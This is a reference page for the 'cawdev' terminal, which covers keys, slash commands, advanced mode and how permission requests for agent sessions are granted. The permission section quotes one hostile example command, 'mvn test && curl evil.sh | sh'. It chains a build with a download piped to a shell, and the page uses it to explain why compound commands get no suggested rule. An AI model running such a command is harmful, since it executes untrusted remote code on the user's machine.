---
title: The attached terminal
description: Keys, slash commands, and the three lengths of yes — everything the screen you watch sessions in understands.
---

Running `cawdev` attaches you to a daemon's live view: every session it's
running, printed into your terminal's own scrollback, with a footer for
status and input. This page is the key reference.

## Watching sessions

| Key | Does |
|---|---|
| `1`–`9` | Jump to that numbered session |
| `L` (or `l`) | Open the run list — every session on this machine, live, claiming, or queued |
| `g` | Toggle between the session's own transcript and the daemon's log |
| `enter` (or `i`) | Start typing a prompt to the session you're watching |
| `/` | Start typing a slash command |
| `q` | Quit — asks twice while sessions are running |
| `ctrl+c` | Once: cancel whatever's open (a picker, a line). Twice: quit. |

Quitting stops the daemon too — one word started it, one key stops it. Pass
`--leave-running` when you launch `cawdev` to keep the daemon up after you
detach; then quitting only closes this window.

## Slash commands

| Command | Does |
|---|---|
| `/help` | This list |
| `/login` | Sign in through the browser |
| `/logout` | Forget the stored session on this machine |
| `/runs` | The run list — same as `L` |
| `/config` | This machine's config — same as `c` |
| `/cancel` | Cancel the session you're watching |
| `/log` | Toggle the daemon's own log — same as `g` |
| `/advanced-mode` | One window per session around the prompt, for the projects you tick (`@slug` names them) — or back. See [Advanced mode](#advanced-mode). |
| `/new` | Start a session here: `/new plan R3`, `/new dev R3`, `/new plan` or `/new dev <the task in words>`, `/new ask <question>` — `@project` picks which project |
| `/develop` | Start development on the card a finished plan session was about |
| `/pr` | Open the pull request of a finished session's branch |
| `/continue` | Pick a failed or stopped session back up on this machine — the console's *Carry on* |
| `/projects` | Which projects advanced mode shows — tick one or several |
| `/open` | Open the session's pull request in your browser |
| `/drop` | Delete the checkout a finished session was made on demand for |
| `/close` | Close an ended session's window |
| `/reload` | Quit and start again on the code on disk — the runner too, when nothing is running |
| `/quit` | Stop the runner and leave (`--leave-running` keeps it up) |

## Advanced mode

`/advanced-mode` splits the screen into one window per session, laid out
around a prompt that stays anchored at the bottom — for watching several
sessions side by side instead of switching between them with `1`–`9`. It
draws on the terminal's alternate screen, the way `vim` and `emacs` do, so
your normal scrollback is untouched underneath; leaving the mode (run the
command again) puts it back exactly as it was, with whatever the sessions
said while you were away folded in then. At most four windows are shown at
once — the rest sit on a tab line below them.

Above the windows, a strip draws the roadmap of every project this machine
serves as a small board — Considering, Planned, In development and Merged as
columns, one line per card, a `●` beside a card with a session running on it
right now. `/projects` picks which projects the strip and the mode cover
(`@slug` on any command names one directly). When there isn't room, a column
folds to a count first (`merged 3 hidden`), then a whole project
(`+3 projects`) — a project always keeps at least one column, and a card is
never cut in half.

From inside advanced mode:

- **`/new plan R3`** or **`/new dev R3`** starts a plan or a coding session on
  an existing card; **`/new plan <a sentence>`** or **`/new dev <a
  sentence>`** files the card first and starts the session on it in one step;
  **`/new ask <question>`** starts an ask session. `@project` says which
  project when it isn't the only one shown.
- **`/develop`** starts development on the card a finished plan session was
  about.
- A session with no free checkout gets one **cloned on demand** instead of
  queuing — set how many per project with `autoWorkspaces` in the
  [config file](/cli/config-file/); off (`0`) by default, since cloning
  spends disk and time nobody asked to spend. **`/drop`** deletes a checkout
  made this way once you're done with it.
- **`/pr`** opens the pull request for a finished session's branch (pushing
  it first if needed); once one exists, the window's action line shows it and
  **`/open`** opens it in your browser.
- **`/continue`** picks a stopped or failed session back up on this machine —
  the terminal's own version of the console's **Carry on**.
- **`/close`** closes a window whose session has ended; **`/reload`** quits
  and restarts the CLI on whatever's on disk right now, restarting the
  runner too if nothing is running on it.

## Configuring this machine without leaving

`c` opens the same menu as `cawdev config` on the command line — add a
project, add a workspace, enable or disable an agent, turn
`acceptsRulesFromConsole` on or off, or just show the config. Every change
writes the config file; a daemon already running is told to restart if the
change needs one.

## Answering a question

`a` answers the question the session you're watching has stopped on — only
when it's yours to answer (R58: a question belongs to whoever started the run,
plus any project owner). If the session offered options, you get a picker
whose last row is always **write my own answer**; press `Esc` from there to
go back to the list rather than losing what you typed. With no options, `a`
goes straight to a line.

A session **blocked on a question cannot read a prompt** — pressing `enter`
while one is open tells you to press `a` instead, rather than swallowing what
you type.

## Deciding a permission request

When a session stops to ask permission for something, four keys are on offer
— never more than that, because a terminal has one key per idea and a grant
that gets cut short mid-sentence is a promise nobody made:

| Key | Grants | Lasts |
|---|---|---|
| `y` | Just this one call | Once |
| `s` | The whole tool, or the suggested pattern (e.g. `Bash(mvn *)`) | For the rest of this session |
| `Y` | The suggested pattern, or — for a command with no wildcard shape — the exact command | As a **project** rule, written to the platform |
| `M` | The same pattern | As a rule for **every project this machine ever runs** |
| `n` | Refuses, and asks why | — |

`Y` and `M` only appear when there's a pattern to write — a compound shell
command (`mvn test && curl evil.sh | sh`) gets no suggested rule at all, on
purpose, and `s` is the widest either of those can ever be handed.

`M` only appears when this machine's config has
`"acceptsRulesFromConsole": true` — see
[Permissions and the shield](/cli/permissions-and-shield/) for what turning
that on actually means. Press it without that setting and the terminal tells
you what to add rather than pretending it worked.

## Two URLs

`--url` (or `CAWDEV_URL`) says **where you sign in** — a browser question. The
config's `url` says **what this machine is called**, and therefore the key its
token is filed under. They usually agree; in development the console and the
API it proxies to are on different ports, and a browser needs the console's
to get a sign-in page at all. `cawdev` says so out loud whenever the two
differ, because a token minted at one and filed under the other is a live
credential nothing will ever find again.

`cawdev --config <file>` signs in at that file's own `url` rather than at
cawdev's hosted default — the order is `--url`, then `CAWDEV_URL`, then the
config, then `https://app.cawdev.com`. A self-hosted instance run this way no
longer opens the wrong browser tab for the person's own session.
